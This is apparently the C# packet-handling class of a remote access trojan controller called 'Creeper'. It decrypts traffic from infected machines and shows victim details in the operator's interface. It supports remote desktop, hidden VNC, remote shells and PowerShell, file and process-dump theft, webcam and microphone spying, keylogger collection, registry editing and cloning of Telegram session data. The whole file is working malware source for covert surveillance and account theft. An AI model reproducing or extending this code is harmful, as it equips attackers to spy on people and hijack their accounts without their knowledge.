using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using System.Xml.Linq;
using Creeper.Connection;
using Creeper.Helper;
using Creeper.helpForms;
using Creeper.Properties;
using Creeper.singleForms;
using MessagePack;
using Microsoft.Win32;

namespace Creeper.HandlePacket
{
    class Packet
    {
        public static void Read(object Obj)
        {
            Clients client = null;
            try
            {
                object[] array = Obj as object[];
                byte[] data = (byte[])array[0];
                client = (Clients)array[1];
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(Aes.Decrypt(data));
                string temp = unpack_msgpack.ForcePathObject("Packet").AsString;
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "ClientInfo":
                        {
                            client.Info.IP = client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0];
                            client.Info.HWID = unpack_msgpack.ForcePathObject("HWID").AsString;
                            client.Info.User = unpack_msgpack.ForcePathObject("User").AsString;
                            client.Info.OS = unpack_msgpack.ForcePathObject("OS").AsString;
                            client.Info.Camera = unpack_msgpack.ForcePathObject("Camera").AsString;
                            client.Info.InstallTime = unpack_msgpack.ForcePathObject("Install-Time").AsString;
                            client.Info.Path = unpack_msgpack.ForcePathObject("Path").AsString;
                            client.Info.Version = unpack_msgpack.ForcePathObject("Version").AsString;
                            client.Info.Permission = unpack_msgpack.ForcePathObject("Admin").AsString;
                            client.Info.AV = unpack_msgpack.ForcePathObject("AV").AsString;
                            client.Info.Group = unpack_msgpack.ForcePathObject("Group").AsString;
                            client.Info.Active = unpack_msgpack.ForcePathObject("Active").AsString;
                            client.Info.ClrVersion = (int)unpack_msgpack.ForcePathObject("ClrVersion").GetAsInteger();
                            client.Info.LastPing = DateTime.Now;

                            client.LV = new ListViewItem
                            {
                                Tag = client,
                                Text = client.Info.IP,
                                ToolTipText = client.Info.Path
                            };
                            client.LV.SubItems.Add(Helper.Helper.Map_ip(client.Info.IP));
                            XDocument myDoc = XDocument.Load(Path.Combine(Application.StartupPath, "Clients Folder", "Note.xml"));

                            IEnumerable<XElement> products = from c in myDoc.Descendants("Client") where c.FirstAttribute.Value == client.Info.HWID select c;
                            if (products.Count() > 0)
                            {
                                XElement product = products.First();
                                if (product.Element("Note").Value!="")
                                {
                                    client.LV.SubItems.Add(product.Element("Note").Value + "-" + unpack_msgpack.ForcePathObject("Group").AsString);
                                }
                                else
                                {
                                    client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
                                }
                            }
                            else
                            {
                                XElement newElement = new XElement("Client", new XAttribute("HWID", client.Info.HWID), new XElement("Note", ""));
                                myDoc.Descendants("Clients").First().Add(newElement);
                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
                            }
                            client.LV.SubItems.Add(client.Info.HWID);
                            if (unpack_msgpack.ForcePathObject("User").AsString.ToLower() == "system")
                            {
                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                            }
                            else
                            {
                                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString + "/" + unpack_msgpack.ForcePathObject("Admin").AsString);
                            }
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Camera").AsString);
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Install-Time").AsString);
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("AV").AsString);
                            client.LV.SubItems.Add("00ms");
                            client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Active").AsString);
                            client.LV.SubItems.Add("00:00:00");

                            FormMain.childForm_Home.Invoke((MethodInvoker)(() =>
                            {
                                lock (Setting.LockListviewClients)
                                {
                                    FormMain.childForm_Home.listViewHome.Items.Add(client.LV);
                                    FormMain.childForm_Home.listViewHome.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                                    FormMain.childForm_Home.AppandLog(client.Info.HWID + ": Client connected !");
                                }
                                FormMain.childForm_Home.notifyIcon.Visible = true;
                                FormMain.childForm_Home.notifyIcon.BalloonTipText =
                                $"New Client Online!\n\n" +
                                $"IP:{client.Info.IP}\n" +
                                $"User:{client.Info.User}\n" +
                                $"OS:{client.Info.OS}\n" +
                                $"Group:{client.Info.Group}";
                                FormMain.childForm_Home.notifyIcon.ShowBalloonTip(100);
                                FormMain.childForm_Home.notifyIcon.Visible = false;
                            }));

                            break;
                        }

                    case "ClientPing":
                        {
                            client.LV.SubItems[9].Text = unpack_msgpack.ForcePathObject("Roundtrip").AsString + "ms";
                            client.LV.SubItems[10].Text = unpack_msgpack.ForcePathObject("Message").AsString;
                            client.LV.SubItems[11].Text = new TimeSpan(0, 0, (int)(int.Parse(unpack_msgpack.ForcePathObject("LastInput").AsString) / 1000)).ToString(@"hh\:mm\:ss");
                            client.Info.LastPing = DateTime.Now;
                            break;
                        }

                    case "remoteDesktop":
                        {
                            singleFormScreen RD = (singleFormScreen)Application.OpenForms["desktop:" + client.Info.HWID];
                            if (RD != null)
                            {
                                RD.BeginInvoke((MethodInvoker)(() =>
                                {
                                    byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                                    if (!RD.init)
                                    {
                                        Bitmap decoded0 = RD.decoder.DecodeData(new MemoryStream(RdpStream));
                                        RD.rdSize = decoded0.Size;
                                        int Screens = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
                                        RD.toolStripComboBoxswitch.Items.Clear();
                                        for (int i = 0; i < Screens; i++)
                                        {
                                            RD.toolStripComboBoxswitch.Items.Add(i);
                                        }
                                        RD.init = true;
                                        FormMain.childForm_Home.AppandLog(client.Info.HWID + ": Remote Desktop Opened !");
                                    }
                                    lock (RD.syncPicbox)
                                    {
                                        using (MemoryStream stream = new MemoryStream(RdpStream))
                                        {
                                            var StreamDecodeData = RD.decoder.DecodeData(stream);
                                            RD.GetImage = StreamDecodeData;
                                            RD.rdSize = StreamDecodeData.Size;
                                        }
                                        RD.pictureBoxscreen.Image = RD.GetImage;
                                    }
                                }));
                            }
                            break;
                        }

                    case "shell":
                        {
                            singleFormCmd shell = (singleFormCmd)Application.OpenForms["shell:" + client.Info.HWID];
                            if (shell != null)
                            {
                                lock (shell.LockrichTextBox)
                                {
                                    shell.Invoke(new ThreadStart(delegate {
                                        shell.richTextBox.AppendText(unpack_msgpack.ForcePathObject("ReadInput").AsString);
                                        shell.richTextBox.SelectionStart = shell.richTextBox.TextLength;
                                        shell.richTextBox.ScrollToCaret();
                                        Thread.Sleep(10);
                                    }));
                                    if (string.IsNullOrEmpty(shell.richTextBox.Text))
                                    {
                                        FormMain.childForm_Home.AppandLog(client.Info.HWID + ": Remote Shell Opened !");
                                    }
                                }
                            }
                            break;
                        }

                    case "powershell":
                        {
                            singleFormPowershell shell = (singleFormPowershell)Application.OpenForms["powershell:" + client.Info.HWID];
                            if (shell != null)
                            {
                                if (string.IsNullOrEmpty(unpack_msgpack.ForcePathObject("ReadInput").AsString)) return;
                                lock (shell.LockrichTextBox)
                                {
                                    shell.Invoke(new ThreadStart(delegate {
                                        shell.richTextBox.AppendText(unpack_msgpack.ForcePathObject("ReadInput").AsString);
                                        shell.richTextBox.SelectionStart = shell.richTextBox.TextLength;
                                        shell.richTextBox.ScrollToCaret();
                                        Thread.Sleep(10);
                                    }));
                                    if (shell.richTextBox.Text != "")
                                    {
                                        FormMain.childForm_Home.AppandLog(client.Info.HWID + ": Remote Powershell Opened !");
                                    }
                                }
                            }
                            break;
                        }

                    case "process":
                        {
                            singleFormProcess process = (singleFormProcess)Application.OpenForms["process:" + client.Info.HWID];
                            if (process != null)
                            {
                                if (process.listViewprocess.Items.Count == 0)
                                {
                                    FormMain.childForm_Home.AppandLog(client.Info.HWID + ": Process List obtained !");
                                }
                                process.Invoke((MethodInvoker)(() =>
                                {
                                    process.listViewprocess.Items.Clear();
                                    process.imageList.Images.Clear();
                                    string processLists = unpack_msgpack.ForcePathObject("Message").AsString;
                                    string[] _NextProc = processLists.Split(new[] { "-=>" }, StringSplitOptions.None);
                                    for (int i = 0; i < _NextProc.Length; i++)
                                    {
                                        if (_NextProc[i].Length > 0)
                                        {
                                            ListViewItem lv = new ListViewItem
                                            {
                                                Text = Path.GetFileName(_NextProc[i + 2])
                                            };
                                            lv.SubItems.Add(_NextProc[i + 1]);
                                            lv.SubItems.Add(_NextProc[i + 4]);
                                            lv.SubItems.Add(_NextProc[i + 12]);//bit
                                            lv.SubItems.Add(_NextProc[i + 13]);//owner
                                            lv.SubItems.Add(_NextProc[i + 14]);//clr
                                            lv.SubItems.Add(_NextProc[i + 5]);
                                            lv.SubItems.Add((long.Parse(_NextProc[i + 6]) / 1000) + " KB");
                                            lv.SubItems.Add((long.Parse(_NextProc[i + 7]) / 1000) + " KB");
                                            lv.SubItems.Add(_NextProc[i + 8]);
                                            lv.SubItems.Add(_NextProc[i + 9]);
                                            lv.SubItems.Add(_NextProc[i + 10]);
                                            lv.SubItems.Add(_NextProc[i + 11]);

                                            lv.ToolTipText = "Path:" + Environment.NewLine + _NextProc[i] + Environment.NewLine + "Command Line:" + Environment.NewLine + _NextProc[i + 3];
                                            Image im = Image.FromStream(new MemoryStream(Convert.FromBase64String(_NextProc[i + 15])));
                                            process.imageList.Images.Add(_NextProc[i + 1], im);
                                            lv.ImageKey = _NextProc[i + 1];
                                            process.listViewprocess.Items.Add(lv);
                                        }
                                        i += 15;
                                    }
                                }));
                            }
                        }
                        break;

                    case "processDump":
                        {
                            string fullPath = Path.Combine(Application.StartupPath, "Clients Folder", client.Info.HWID, "Process Dump");
                            if (!Directory.Exists(fullPath))
                            {
                                Directory.CreateDirectory(fullPath);
                            }

                            File.WriteAllBytes(fullPath + "\\" + unpack_msgpack.ForcePathObject("Name").AsString.Replace("\\", "").Replace("/", "") + ".dmp", unpack_msgpack.ForcePathObject("Message").GetAsBytes());

                            FormMain.childForm_Home.AppandLog(client.Info.HWID + ": Process " + unpack_msgpack.ForcePathObject("Name").AsString + " Dumped !");
                        }
                        break;

                    case "getDrivers":
                        {
                            singleFormFile FM = (singleFormFile)Application.OpenForms["file:" + client.Info.HWID];
                            if (FM != null)
                            {
                                if (FM.listViewfile.Items.Count == 0)
                                {
                                    FormMain.childForm_Home.AppandLog(client.Info.HWID + ": Remote File Manager Opened !");
                                }
                                FM.toolStripTextBoxaddress.Text = "";
                                FM.listViewfile.Items.Clear();
                                string[] driver = unpack_msgpack.ForcePathObject("Driver").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
                                for (int i = 0; i < driver.Length; i++)
                                {
                                    if (driver[i].Length > 0)
                                    {
                                        ListViewItem lv = new ListViewItem
                                        {
                                            Text = driver[i],
                                            ToolTipText = driver[i]
                                        };
                                        FM.imageList.Images.Clear();
                                        FM.imageList.Images.Add("0_folder", Resources.folder);
                                        FM.imageList.Images.Add("1_HDD", Resources.HDD);
                                        FM.imageList.Images.Add("2_USB", Resources.USB);

                                        FM.imageListlarge.Images.Clear();
                                        FM.imageListlarge.Images.Add("0_folder", Resources.folder);
                                        FM.imageListlarge.Images.Add("1_HDD", Resources.HDD);
                                        FM.imageListlarge.Images.Add("2_USB", Resources.USB);
                                        if (driver[i + 1] == "Fixed")
                                        {
                                            lv.ImageIndex = 1;
                                        }
                                        else if (driver[i + 1] == "Removable")
                                        {
                                            lv.ImageIndex = 2;
                                        }
                                        else
                                        {
                                            lv.ImageIndex = 1;
                                        }

                                        FM.listViewfile.Items.Add(lv);
                                    }
                                    i += 1;
                                }
                            }
                            break;
                        }

                    case "getPath":
                        {
                            singleFormFile FM = (singleFormFile)Application.OpenForms["file:" + client.Info.HWID];
                            if (FM != null)
                            {
                                FM.toolStripTextBoxaddress.Text = unpack_msgpack.ForcePathObject("CurrentPath").AsString;
                                if (FM.toolStripTextBoxaddress.Text.EndsWith("\\"))
                                {
                                    FM.toolStripTextBoxaddress.Text = FM.toolStripTextBoxaddress.Text.Substring(0, FM.toolStripTextBoxaddress.Text.Length - 1);
                                }
                                if (FM.toolStripTextBoxaddress.Text.Length == 2)
                                {
                                    FM.toolStripTextBoxaddress.Text = FM.toolStripTextBoxaddress.Text + "\\";
                                }

                                FM.listViewfile.BeginUpdate();
                                //
                                FM.listViewfile.Items.Clear();
                                FM.imageList.Images.Clear();
                                FM.imageList.Images.Add("0_folder", Resources.folder);
                                FM.imageListlarge.Images.Clear();
                                FM.imageListlarge.Images.Add("0_folder", Resources.folder);
                                FM.listViewfile.Groups.Clear();
                                FM.toolStripLabelalert.Text = "";

                                ListViewGroup groupFolder = new ListViewGroup("Folders");
                                ListViewGroup groupFile = new ListViewGroup("Files");

                                FM.listViewfile.Groups.Add(groupFolder);
                                FM.listViewfile.Groups.Add(groupFile);

                                FM.listViewfile.Items.AddRange(singleFormFile.GetFolders(unpack_msgpack, groupFolder).ToArray());
                                FM.listViewfile.Items.AddRange(singleFormFile.GetFiles(unpack_msgpack, groupFile, FM.imageList, FM.imageListlarge).ToArray());
                                //
                                FM.listViewfile.Enabled = true;
                                FM.listViewfile.Focus();
                                FM.listViewfile.EndUpdate();

                                FM.toolStripLabelcount.Text = $"Folder[{FM.listViewfile.Groups[0].Items.Count}]   Files[{FM.listViewfile.Groups[1].Items.Count}]";
                            }
                            break;
                        }

                    case "fileError":
                        {
                            singleFormFile FM = (singleFormFile)Application.OpenForms["file:" + client.Info.HWID];
                            if (FM != null)
                            {
                                FM.toolStripLabelalert.Text = unpack_msgpack.ForcePathObject("Message").AsString;
                                FM.listViewfile.Enabled = true;
                            }
                            break;
                        }

                    case "fileDownload":
                        {
                            string extension;
                            if (FormMain.childForm_Home.InvokeRequired)
                            {
                                FormMain.childForm_Home.BeginInvoke((MethodInvoker)(() =>
                                {
                                    string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
                                    if (!Directory.Exists(Path.Combine(Application.StartupPath, "Clients Folder\\" + client.Info.HWID)))
                                    {
                                        Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Clients Folder\\" + client.Info.HWID));
                                    }

                                    string filename = Path.Combine(Application.StartupPath, "Clients Folder\\" + client.Info.HWID + "\\" + unpack_msgpack.ForcePathObject("Name").AsString.Replace("\\", "").Replace("/", ""));
                                    if (File.Exists(filename))
                                    {
                                        extension = Path.GetExtension(filename);
                                        filename = filename.Substring(0, filename.Length - extension.Length) + "_" + DateTime.Now.ToString("yyyy-MM-dd--HH:mm:ss") + extension;
                                    }
                                    File.WriteAllBytes(filename, unpack_msgpack.ForcePathObject("File").GetAsBytes());
                                    FormMain.childForm_Home.AppandLog(client.Info.HWID + ": File " + Path.GetFileName(filename) + " downloaded !");
                                }));
                            }
                            break;
                        }

                    case "getWebcams":
                        {
                            singleFormCamera singleFormCamera = (singleFormCamera)Application.OpenForms["webcam:" + client.Info.HWID];
                            if (singleFormCamera != null)
                            {
                                foreach (string camDriver in unpack_msgpack.ForcePathObject("List").AsString.Split(new[] { "-=>" }, StringSplitOptions.None))
                                {
                                    if (!string.IsNullOrWhiteSpace(camDriver))
                                    {
                                        singleFormCamera.toolStripComboBoxswitch.Items.Add(camDriver);
                                    }
                                }
                                singleFormCamera.toolStripComboBoxswitch.SelectedIndex = 0;
                                if (singleFormCamera.toolStripComboBoxswitch.Text == "None")
                                {
                                    singleFormCamera.toolStripButtonstartcam.Enabled = false;
                                }
                                FormMain.childForm_Home.AppandLog(client.Info.HWID + ": Remote Webcam Opened !");
                            }
                            break;
                        }

                    case "webcam":
                        {
                            singleFormCamera singleFormCamera = (singleFormCamera)Application.OpenForms["webcam:" + client.Info.HWID];
                            if (singleFormCamera != null)
                            {
                                singleFormCamera.BeginInvoke((MethodInvoker)(() =>
                                {
                                    byte[] RdpStream = unpack_msgpack.ForcePathObject("Image").GetAsBytes();
                                    lock (singleFormCamera.syncPicbox)
                                    {
                                        using (MemoryStream stream = new MemoryStream(RdpStream))
                                        {
                                            var StreamDecodeData = singleFormCamera.decoder.DecodeData(stream);
                                            singleFormCamera.GetImage = StreamDecodeData;
                                            singleFormCamera.pictureBoxcamera.Image = singleFormCamera.GetImage;
                                            if (singleFormCamera.SaveIt)
                                            {
                                                string FullPath = Path.Combine(Application.StartupPath, "Clients Folder", client.Info.HWID, "WebCam");
                                                if (!Directory.Exists(FullPath))
                                                {
                                                    Directory.CreateDirectory(FullPath);
                                                }

                                                singleFormCamera.pictureBoxcamera.Image.Save(FullPath + $"\\IMG_{DateTime.Now.ToString("yyyy-MM-dd HH;mm;ss")}.jpeg", ImageFormat.Jpeg);
                                            }
                                        }
                                    }
                                }));
                            }
                            break;
                        }

                    case "network":
                        {
                            singleFormNetwork singleFormNetwork = (singleFormNetwork)Application.OpenForms["network:" + client.Info.HWID];
                            if (singleFormNetwork != null)
                            {
                                FormMain.childForm_Home.AppandLog(client.Info.HWID + ": Netstat Obtained !");
                                singleFormNetwork.listViewnetwork.Items.Clear();
                                string processLists = unpack_msgpack.ForcePathObject("Message").AsString;
                                string[] _NextProc = processLists.Split(new[] { "-=>" }, StringSplitOptions.None);
                                for (int i = 0; i < _NextProc.Length; i++)
                                {
                                    if (_NextProc[i + 1].Length > 0)
                                    {
                                        ListViewItem lv = new ListViewItem
                                        {
                                            Text = Path.GetFileName(_NextProc[i])
                                        };
                                        lv.SubItems.Add(_NextProc[i + 1]);
                                        lv.SubItems.Add(_NextProc[i + 2]);
                                        lv.SubItems.Add(_NextProc[i + 3]);
                                        lv.SubItems.Add(_NextProc[i + 4]);
                                        lv.SubItems.Add(_NextProc[i + 5]);
                                        lv.ToolTipText = _NextProc[i + 1];
                                        singleFormNetwork.listViewnetwork.Items.Add(lv);
                                    }
                                    i += 5;
                                }
                            }
                            break;
                        }

                    case "device":
                        {
                            singleFormDevice formDevice = (singleFormDevice)Application.OpenForms["device:" + client.Info.HWID];
                            if (formDevice != null)
                            {
                                formDevice.Invoke((MethodInvoker)(() =>
                                {
                                    formDevice.listViewDevice.Items.Clear();
                                    formDevice.listViewDevice.Groups.Clear();
                                    singleFormDevice.GetAllDevices(unpack_msgpack.ForcePathObject("Message").AsString, formDevice.listViewDevice);
                                }));
                                FormMain.childForm_Home.AppandLog(client.Info.HWID + ": Device List Obtained !");
                            }
                            break;
                        }

                    case "CreateKey":
                        {
                            singleFormRegistry singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + client.Info.HWID];
                            if (singleFormRegistry != null)
                            {
                                singleFormRegistry.Invoke((MethodInvoker)(() =>
                                {
                                    string ParentPath = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                                    byte[] Matchbyte = unpack_msgpack.ForcePathObject("Match").GetAsBytes();
                                    singleFormRegistry.CreateNewKey(ParentPath, Helper.Helper.DeSerializeMatch(Matchbyte));
                                }));
                            }
                            break;
                        }

                    case "LoadKey":
                        {
                            singleFormRegistry singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + client.Info.HWID];
                            if (singleFormRegistry != null)
                            {
                                singleFormRegistry.Invoke((MethodInvoker)(() =>
                                {
                                    string rootKey = unpack_msgpack.ForcePathObject("RootKey").AsString;
                                    byte[] Matchesbyte = unpack_msgpack.ForcePathObject("Matches").GetAsBytes();
                                    singleFormRegistry.AddKeys(rootKey, Helper.Helper.DeSerializeMatches(Matchesbyte));
                                }));
                                if (string.IsNullOrEmpty(unpack_msgpack.ForcePathObject("RootKey").AsString))
                                {
                                    FormMain.childForm_Home.AppandLog(client.Info.HWID + ": Remote Registry opened !");
                                }
                            }
                            break;
                        }

                    case "DeleteKey":
                        {
                            singleFormRegistry singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + client.Info.HWID];
                            if (singleFormRegistry != null)
                            {
                                singleFormRegistry.Invoke((MethodInvoker)(() =>
                                {
                                    string rootKey = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                                    string subkey = unpack_msgpack.ForcePathObject("KeyName").AsString;
                                    singleFormRegistry.DeleteKey(rootKey, subkey);
                                }));
                            }
                            break;
                        }

                    case "RenameKey":
                        {
                            singleFormRegistry singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + client.Info.HWID];
                            if (singleFormRegistry != null)
                            {
                                singleFormRegistry.Invoke((MethodInvoker)(() =>
                                {
                                    string rootKey = unpack_msgpack.ForcePathObject("rootKey").AsString;
                                    string oldName = unpack_msgpack.ForcePathObject("oldName").AsString;
                                    string newName = unpack_msgpack.ForcePathObject("newName").AsString;
                                    singleFormRegistry.RenameKey(rootKey, oldName, newName);
                                }));
                            }
                            break;
                        }

                    case "CreateValue":
                        {
                            singleFormRegistry singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + client.Info.HWID];
                            if (singleFormRegistry != null)
                            {
                                singleFormRegistry.Invoke((MethodInvoker)(() =>
                                {
                                    string keyPath = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                    string Kindstring = unpack_msgpack.ForcePathObject("Kindstring").AsString;
                                    string newKeyName = unpack_msgpack.ForcePathObject("newKeyName").AsString;
                                    RegistryValueKind Kind = RegistryValueKind.None;
                                    switch (Kindstring)
                                    {
                                        case "-1":
                                            {
                                                Kind = RegistryValueKind.None;
                                                break;
                                            }
                                        case "0":
                                            {
                                                Kind = RegistryValueKind.Unknown;
                                                break;
                                            }
                                        case "1":
                                            {
                                                Kind = RegistryValueKind.String;
                                                break;
                                            }
                                        case "2":
                                            {
                                                Kind = RegistryValueKind.ExpandString;
                                                break;
                                            }
                                        case "3":
                                            {
                                                Kind = RegistryValueKind.Binary;
                                                break;
                                            }
                                        case "4":
                                            {
                                                Kind = RegistryValueKind.DWord;
                                                break;
                                            }
                                        case "7":
                                            {
                                                Kind = RegistryValueKind.MultiString;
                                                break;
                                            }
                                        case "11":
                                            {
                                                Kind = RegistryValueKind.QWord;
                                                break;
                                            }
                                    }
                                    Helper.RegistrySeeker.RegValueData regValueData = new Helper.RegistrySeeker.RegValueData
                                    {
                                        Name = newKeyName,
                                        Kind = Kind,
                                        Data = new byte[] { }
                                    };

                                    singleFormRegistry.CreateValue(keyPath, regValueData);
                                }));

                            }
                            break;
                        }

                    case "DeleteValue":
                        {
                            singleFormRegistry singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + client.Info.HWID];
                            if (singleFormRegistry != null)
                            {
                                singleFormRegistry.Invoke((MethodInvoker)(() =>
                                {
                                    string keyPath = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                    string ValueName = unpack_msgpack.ForcePathObject("ValueName").AsString;

                                    singleFormRegistry.DeleteValue(keyPath, ValueName);
                                }));

                            }
                            break;
                        }

                    case "RenameValue":
                        {
                            singleFormRegistry singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + client.Info.HWID];
                            if (singleFormRegistry != null)
                            {
                                singleFormRegistry.Invoke((MethodInvoker)(() =>
                                {
                                    string keyPath = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                    string OldValueName = unpack_msgpack.ForcePathObject("OldValueName").AsString;
                                    string NewValueName = unpack_msgpack.ForcePathObject("NewValueName").AsString;

                                    singleFormRegistry.RenameValue(keyPath, OldValueName, NewValueName);
                                }));

                            }
                            break;
                        }
                    case "ChangeValue":
                        {
                            singleFormRegistry singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + client.Info.HWID];
                            if (singleFormRegistry != null)
                            {
                                singleFormRegistry.Invoke((MethodInvoker)(() =>
                                {
                                    string keyPath = unpack_msgpack.ForcePathObject("keyPath").AsString;
                                    byte[] RegValueDatabyte = unpack_msgpack.ForcePathObject("Value").GetAsBytes();

                                    singleFormRegistry.ChangeValue(keyPath, Helper.Helper.DeSerializeRegValueData(RegValueDatabyte));
                                }));

                            }
                            break;
                        }

                    case "voice":
                        {
                            singleFormVoice formVoice = (singleFormVoice)Application.OpenForms["voice:" + client.Info.HWID];
                            if (formVoice != null && formVoice._isRun)
                            {
                                try
                                {
                                    byte[] br = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                                    formVoice._player.PlayData(br);
                                }
                                catch { }
                            }
                            break;
                        }

                    case "keyLogger":
                        {
                            singleFormKeyLogger formKeyLogger = (singleFormKeyLogger)Application.OpenForms["keylogger:" + client.Info.HWID];
                            if (formKeyLogger != null)
                            {
                                formKeyLogger.Sb.Append(unpack_msgpack.ForcePathObject("log").GetAsString());
                                formKeyLogger.richTextBox.Text = formKeyLogger.Sb.ToString();
                                formKeyLogger.richTextBox.SelectionStart = formKeyLogger.richTextBox.TextLength;
                                formKeyLogger.richTextBox.ScrollToCaret();
                            }
                            break;
                        }

                    case "keyLoggerSave":
                        {
                            string FullPath = Path.Combine(Application.StartupPath, "Clients Folder", client.Info.HWID, "Keylogger");
                            if (!Directory.Exists(FullPath))
                                Directory.CreateDirectory(FullPath);
                            File.WriteAllText(FullPath + $"\\KeyloggerSave_{DateTime.Now.ToString("yyyy-MM-dd HH;mm;ss")}.txt", unpack_msgpack.ForcePathObject("log").AsString);
                            FormMain.childForm_Home.AppandLog(client.Info.HWID + ": Keylogger File downloaded !");
                            break;
                        }

                    case "hvnc":
                        {
                            singleFormHVNC RD = (singleFormHVNC)Application.OpenForms["hvnc:" + client.Info.HWID];
                            if (RD != null)
                            {
                                byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                                MemoryStream stream = null;
                                stream = new MemoryStream(RdpStream);
                                Bitmap decoded0 = new Bitmap(new Bitmap(stream));

                                lock (RD.syncPicbox)
                                {
                                    RD.GetImage = decoded0;
                                    RD.rdSize = decoded0.Size;
                                    RD.pictureBoxHVNC.Image = RD.GetImage;
                                }
                            }
                            break;
                        }

                    case "thumbnail":
                        {
                            FormMain.childForm_Home.Invoke((MethodInvoker)(() =>
                            {
                                using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                                {
                                    lock (Setting.LockListviewClients)
                                    {
                                        try
                                        {
                                            FormMain.childForm_Home.imageListicon.Images.RemoveByKey(client.Info.HWID);
                                        }
                                        catch { }
                                        FormMain.childForm_Home.imageListicon.Images.Add(client.Info.HWID, Bitmap.FromStream(memoryStream));
                                        foreach (ListViewItem item in FormMain.childForm_Home.listViewHome.Items)
                                        {
                                            if (item.SubItems[3].Text == client.Info.HWID)
                                            {
                                                item.ImageKey = client.Info.HWID;
                                            }
                                        }
                                    }
                                }
                            }));
                        }
                        break;

                    case "Message":
                        {
                            string FullPath = Path.Combine(Application.StartupPath, "Clients Folder", client.Info.HWID, "Message");
                            if (!Directory.Exists(FullPath))
                            {
                                Directory.CreateDirectory(FullPath);
                            }
                            string path = FullPath + $"\\Message_{DateTime.Now.ToString("yyyy-MM-dd HH;mm;ss")}.txt";
                            File.WriteAllText(path, unpack_msgpack.ForcePathObject("Message").AsString);
                            //Process.Start(path);
                            FormMain.childForm_Home.Invoke((MethodInvoker)(() =>
                            {
                                helperFormMessage message = new helperFormMessage();

                                message.richTextBox.Text = unpack_msgpack.ForcePathObject("Message").AsString;
                                message.Show();
                            }));
                            break;
                        }

                    case "Log":
                        {
                            FormMain.childForm_Home.AppandLog(client.Info.HWID + ":" + unpack_msgpack.ForcePathObject("Message").AsString);
                            break;
                        }

                    case "telegram":
                        {
                            try
                            {
                                string tempPath = Path.Combine(Application.StartupPath, "Clients Folder", client.Info.HWID, "Telegram");
                                if (!Directory.Exists(tempPath))
                                {
                                    Directory.CreateDirectory(tempPath);
                                }
                                if (!Directory.Exists(tempPath + "\\tdata"))
                                    Directory.CreateDirectory(tempPath + "\\tdata");

                                if (!Directory.Exists(tempPath + "\\tdata\\D877F783D5D3EF8C"))
                                    Directory.CreateDirectory(tempPath + "\\tdata\\D877F783D5D3EF8C");
                                if (!Directory.Exists(tempPath + "\\tdata\\A7FDF864FBC10B77"))
                                    Directory.CreateDirectory(tempPath + "\\tdata\\A7FDF864FBC10B77");
                                if (!Directory.Exists(tempPath + "\\tdata\\F8806DD0C461824F"))
                                    Directory.CreateDirectory(tempPath + "\\tdata\\F8806DD0C461824F");
                                if (!Directory.Exists(tempPath + "\\tdata\\C2B05980D9127787"))
                                    Directory.CreateDirectory(tempPath + "\\tdata\\C2B05980D9127787");
                                if (!Directory.Exists(tempPath + "\\tdata\\0CA814316818D8F6"))
                                    Directory.CreateDirectory(tempPath + "\\tdata\\0CA814316818D8F6");

                                string[] sb = unpack_msgpack.ForcePathObject("Message").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
                                for (int i = 0; i < sb.Length; i++)
                                {
                                    if (sb[i].Length > 0)
                                    {
                                        try
                                        {
                                            File.WriteAllBytes(Path.Combine(tempPath, sb[i]), Convert.FromBase64String(sb[i + 1]));
                                        }
                                        catch { }
                                    }
                                    i += 1;
                                }
                                Process.Start("explorer.exe", tempPath);
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(ex.Message);
                            }

                            FormMain.childForm_Home.AppandLog(client.Info.HWID + ": Telegram cloned !");
                            break;
                        }



                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
        }
    }
}
